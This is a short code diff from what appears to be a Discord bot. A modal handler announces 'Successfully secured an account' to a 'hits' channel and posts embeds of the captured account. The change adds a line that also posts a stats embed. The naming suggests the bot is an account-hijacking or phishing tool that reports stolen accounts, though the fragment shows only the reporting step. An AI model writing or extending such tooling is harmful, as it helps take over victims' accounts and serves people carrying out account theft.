@@ -75,6 +75,7 @@ class MyModalTwo(ui.Modal):
             return
             
         await hits_channel.send("@everyone **Successfully secured an account**")
+        await hits_channel.send(embed = securedAccount["stats_embed"])
         await hits_channel.send(
             embed = securedAccount["hit_embed"],
             view = accountInfo(
